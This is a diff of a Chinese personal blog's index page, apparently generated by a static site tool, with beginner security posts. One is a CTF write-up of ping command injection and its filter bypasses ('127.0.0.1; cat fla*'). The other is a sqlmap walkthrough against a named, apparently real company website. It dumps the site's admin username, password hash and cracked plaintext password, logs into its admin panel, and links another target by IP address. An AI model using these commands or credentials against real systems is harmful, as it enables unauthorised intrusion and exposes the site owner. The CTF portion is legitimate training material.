@@ -71,6 +71,34 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-from_http" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/11/05/from_http/" class="article-date">
+  <time class="dt-published" datetime="2025-11-05T05:17:17.989Z" itemprop="datePublished">2025-11-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://penhuoshuwa.github.io/2025/11/05/from_http/" data-id="cmhllqoj8000fhsw9c2vzg13d" data-title="" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Ping？？" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/11/05/Ping%EF%BC%9F%EF%BC%9F/" class="article-date">
@@ -99,13 +127,12 @@
       
         <h1 id="Ping？？？？-命令注入"><a href="#Ping？？？？-命令注入" class="headerlink" title="Ping？？？？ 命令注入"></a>Ping？？？？ 命令注入</h1><h2 id="先看看网页源代码，没有收获"><a href="#先看看网页源代码，没有收获" class="headerlink" title="先看看网页源代码，没有收获"></a>先看看网页源代码，没有收获</h2><h2 id="输入本机地址127-0-0-1试试"><a href="#输入本机地址127-0-0-1试试" class="headerlink" title="输入本机地址127.0.0.1试试"></a>输入本机地址127.0.0.1试试</h2><p>ping通了</p>
 <h2 id="找找有没有flag"><a href="#找找有没有flag" class="headerlink" title="找找有没有flag"></a>找找有没有flag</h2><p>查看当前目录127.0.0.1; ls<br><img src="/images/w1-2.png"><br>找到了flag文件，尝试读取<br>127.0.0.1; cat flag.txt<br>发现被过滤，绕过过滤<br>输入：127.0.0.1; cat “flag.txt”（引号绕过）—无果<br>输入：127.0.0.1; a&#x3D;flag; b&#x3D;.txt; cat $a$b（变量拼接）—无果<br>输入：127.0.0.1; cat fla*（使用通配符）—成功<br>flag{dd4adb53-4a00-43a4-b000-1ab3dcdd263e}</p>
-<h2 id="看看过滤词"><a href="#看看过滤词" class="headerlink" title="看看过滤词"></a>看看过滤词</h2><p>输入：127.0.0.1; cat fla?.txt<br>输入：127.0.0.1; cat fla[g,h,x,z].txt<br>因此只需要不出现完整的flag便可绕过过滤</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>先看网页源代码<br>输入本机地址查看是否能ping通<br>查找当前目录（127.0.0.1; ls）、查找隐藏目录（127.0.0.1; ls -la）、查找根目录（127.0.0.1; ls &#x2F;）<br>找到flag.txt<br>绕过过滤获得flag</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://penhuoshuwa.github.io/2025/11/05/Ping%EF%BC%9F%EF%BC%9F/" data-id="cmhku8gni0001fcw93a7s9i1k" data-title="webPing？？" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://penhuoshuwa.github.io/2025/11/05/Ping%EF%BC%9F%EF%BC%9F/" data-id="cmhllqoir0001hsw9ckfjhazd" data-title="webPing？？" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -154,7 +181,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://penhuoshuwa.github.io/2025/11/05/%E5%89%8D%E7%AB%AF%E5%B0%8F%E6%B8%B8%E6%88%8F/" data-id="cmhku8gny000dfcw98t4kc9dy" data-title="web前端小游戏" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://penhuoshuwa.github.io/2025/11/05/%E5%89%8D%E7%AB%AF%E5%B0%8F%E6%B8%B8%E6%88%8F/" data-id="cmhllqoj7000ehsw98n3mdty4" data-title="web前端小游戏" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -188,21 +215,21 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="前置准备sqlmap-py"><a href="#前置准备sqlmap-py" class="headerlink" title="前置准备sqlmap.py"></a>前置准备sqlmap.py</h1><p>在文件夹中找到sqlmap.py<br><img src="/images/sql1.png"><br>路径中输入cmd并回车，Windows系统的命令行<br><img src="/images/sql2.png"></p>
+        <h1 id="前置准备sqlmap-py"><a href="#前置准备sqlmap-py" class="headerlink" title="前置准备sqlmap.py"></a>前置准备sqlmap.py</h1><p>在文件夹中找到sqlmap.py<br><img src="/images/sql1.png"><br>路径中输入cmd并回车，Windows系统的命令行<br><img src="/images/sql2.png"><br>网址<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/">http://www.dlhayashi.com/</a><br>登陆点<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/admin/">http://www.dlhayashi.com/admin/</a></p>
 <h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><h2 id="找交互点"><a href="#找交互点" class="headerlink" title="找交互点"></a>找交互点</h2><p>1.具有GET请求的URL  ?关键词&#x3D;值  类似于?id&#x3D;14 ?keyword&#x3D;aaa<br>2.登录框<br>3.搜索框<br><img src="/images/sql3.png"></p>
 <h2 id="验证注入点"><a href="#验证注入点" class="headerlink" title="验证注入点"></a>验证注入点</h2><p>采用最简单的恶意语句 ？id&#x3D;aaa’ 尝试传输，查看页面回显是否是我们想要的效果<br>–数据库会报错 –无法正常查询数据 –页面将会异常回显(空白&#x2F;回显SQL的报错)<br>例如<br><img src="/images/sql4.png"></p>
 <h2 id="挖数据库名称（database或是db）、数据表名称（table）、数据列名称（column）"><a href="#挖数据库名称（database或是db）、数据表名称（table）、数据列名称（column）" class="headerlink" title="挖数据库名称（database或是db）、数据表名称（table）、数据列名称（column）"></a>挖数据库名称（database或是db）、数据表名称（table）、数据列名称（column）</h2><p>注：从此处开始要用到sqlmap.py<br>数据库名称<br>输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/index.php?c=news&a=show&id=8">http://www.dlhayashi.com/index.php?c=news&amp;a=show&amp;id=8</a>“ –current-db</p>
 <h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>-u — 指定具有注入点的URL<br>–current-db — 挖出当前网站的数据库名称</p>
 <h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>输入后按回车，遇到y&#x2F;n写y并回车<br>在ending上方3到5行可以找到挖出的东西<br><img src="/images/sql5.png"><br>数据表名称<br>输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/index.php?c=news&a=show&id=8">http://www.dlhayashi.com/index.php?c=news&amp;a=show&amp;id=8</a>“ -D qdm177261645_db –tables</p>
 <h3 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h3><p>-D — 指定要攻击的数据库名称<br>–tables — 挖出当前网站数据库中所有的数据表名称</p>
-<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p><img src="/images/sql6.png"><br>一般挖admin管理员<br>数据列名称<br>输入输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/index.php?c=news&a=show&id=8">http://www.dlhayashi.com/index.php?c=news&amp;a=show&amp;id=8</a>“ -D qdm177261645_db -T jm_admin –columns<br><img src="/images/sql7.png"><br>挖数据<br>输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/index.php?c=news&a=show&id=8">http://www.dlhayashi.com/index.php?c=news&amp;a=show&amp;id=8</a>“ -D qdm177261645_db -T jm_admin -C username,password –dump<br><img src="/images/sql8.png"><br>注:<br>用户名：admin<br>密码： 1c63129ae9db9c60c3e8aa94d3e00495 — 数据库中本身保存的密文密码 — 密文密码无法直接登录<br>1qaz2wsx — sqlmap帮你解码出来的明文密码 明文密码可以直接登录</p>
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p><img src="/images/sql6.png"><br>一般挖admin管理员<br>数据列名称<br>输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/index.php?c=news&a=show&id=8">http://www.dlhayashi.com/index.php?c=news&amp;a=show&amp;id=8</a>“ -D qdm177261645_db -T jm_admin –columns<br><img src="/images/sql7.png"><br>挖数据<br>输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/index.php?c=news&a=show&id=8">http://www.dlhayashi.com/index.php?c=news&amp;a=show&amp;id=8</a>“ -D qdm177261645_db -T jm_admin -C username,password –dump<br><img src="/images/sql8.png"><br>注:<br>用户名：admin<br>密码： 1c63129ae9db9c60c3e8aa94d3e00495 — 数据库中本身保存的密文密码 — 密文密码无法直接登录<br>1qaz2wsx — sqlmap帮你解码出来的明文密码 明文密码可以直接登录</p>
 <h2 id="进入登入点http-www-dlhayashi-com-admin"><a href="#进入登入点http-www-dlhayashi-com-admin" class="headerlink" title="进入登入点http://www.dlhayashi.com/admin/"></a>进入登入点<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/admin/">http://www.dlhayashi.com/admin/</a></h2><p>输入账号与密码成功进入</p>
-<h1 id="最后给个同类型的网站"><a href="#最后给个同类型的网站" class="headerlink" title="最后给个同类型的网站"></a>最后给个同类型的网站</h1><p><a target="_blank" rel="noopener" href="http://43.139.231.237:34021/">http://43.139.231.237:34021/</a></p>
+<h1 id="同类型的网站"><a href="#同类型的网站" class="headerlink" title="同类型的网站"></a>同类型的网站</h1><p><a target="_blank" rel="noopener" href="http://43.139.231.237:34021/">http://43.139.231.237:34021/</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://penhuoshuwa.github.io/2025/11/04/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmhku8gnq0006fcw95dj8e2l4" data-title="SQL注入漏洞（工具注入）" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://penhuoshuwa.github.io/2025/11/04/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmhllqoiy0006hsw90cl60a49" data-title="SQL注入漏洞（工具注入）" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -241,7 +268,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://penhuoshuwa.github.io/2025/11/04/%E5%88%A9%E7%94%A8burp%20suit%20%E4%BF%AE%E6%94%B9%E6%94%AF%E4%BB%98%E9%87%91%E9%A2%9D/" data-id="cmhku8gnx000cfcw97wvu0hp6" data-title="利用burp suit修改支付金额" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://penhuoshuwa.github.io/2025/11/04/%E5%88%A9%E7%94%A8burp%20suit%20%E4%BF%AE%E6%94%B9%E6%94%AF%E4%BB%98%E9%87%91%E9%A2%9D/" data-id="cmhllqoj7000dhsw99hj4bx7h" data-title="利用burp suit修改支付金额" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -292,7 +319,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://penhuoshuwa.github.io/2025/10/12/hello-world/" data-id="cmhku8gnt0008fcw9c9fuevuy" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://penhuoshuwa.github.io/2025/10/12/hello-world/" data-id="cmhllqoj20008hsw9cugah4r2" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -331,7 +358,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://penhuoshuwa.github.io/2025/09/23/to%20%E5%93%88%E7%BB%B4%E9%85%B1/" data-id="cmhku8gnl0003fcw98bwu4ea4" data-title="To 哈维酱" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://penhuoshuwa.github.io/2025/09/23/to%20%E5%93%88%E7%BB%B4%E9%85%B1/" data-id="cmhllqoiu0003hsw9diek0fld" data-title="To 哈维酱" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -370,7 +397,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://penhuoshuwa.github.io/2025/09/23/%E9%98%B2%E8%AF%88%E5%B0%8F%E8%AF%BE%E5%A0%82/" data-id="cmhku8gny000efcw98p0o18cj" data-title="你掉进陷阱了！" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://penhuoshuwa.github.io/2025/09/23/%E9%98%B2%E8%AF%88%E5%B0%8F%E8%AF%BE%E5%A0%82/" data-id="cmhllqoj4000ahsw9a2vq3fka" data-title="你掉进陷阱了！" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -420,6 +447,10 @@
       <ul>
         
           <li>
+            <a href="/2025/11/05/from_http/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2025/11/05/Ping%EF%BC%9F%EF%BC%9F/">webPing？？</a>
           </li>
         
@@ -433,10 +464,6 @@
         
           <li>
             <a href="/2025/11/04/%E5%88%A9%E7%94%A8burp%20suit%20%E4%BF%AE%E6%94%B9%E6%94%AF%E4%BB%98%E9%87%91%E9%A2%9D/">利用burp suit修改支付金额</a>
-          </li>
-        
-          <li>
-            <a href="/2025/10/12/hello-world/">Hello World</a>
           </li>
         
       </ul>
